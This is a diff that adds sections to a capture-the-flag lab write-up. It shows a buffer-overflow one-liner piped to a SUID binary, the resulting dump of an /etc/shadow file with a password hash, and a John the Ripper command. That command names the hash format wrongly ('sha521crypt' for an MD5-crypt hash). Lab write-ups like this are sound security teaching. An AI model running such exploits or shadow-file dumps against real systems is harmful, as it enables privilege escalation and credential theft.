@@ -142,4 +142,59 @@ And as a part of the output, we find this :
 -rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
 ```
 
-As we can see, the first line looks pretty... unusual and it is : It's the answer of this part
+As we can see, the first line looks pretty... unusual and it is : It's the answer of this part !
+
+## VI - Binary-Exploitation
+I choosed to pass through the manual version of this part so I'll not cover the python part. In fact, the explanation is alreadyb a write-up to it.
+
+After playing a bit with gdb, it looks like the size of our payload has to be 44 chars. Even if it's said, I really encourage you to (re)discover it by yourself.
+
+Then, to access our shell function, I've just pasted the python command they give us :
+
+```
+python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
+```
+
+Which give us an output like this : 
+
+```
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18277:0:99999:7:::
+uuidd:*:18277:0:99999:7:::
+papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
+```
+
+## VII - Password Cracking
+I used John The Ripper (as I get used to it) and the command looks something like this : 
+
+```
+john --format=sha521crypt papa.hash
+```
+And there you are : Root password is owned !
+
+## VIII - Conclusion
+
+I found this box pretty easy even if I stuck on the command execution part.
+By the way, I you found any error or have any improvment to share with this write-up, I'm waiting for your PRs :p
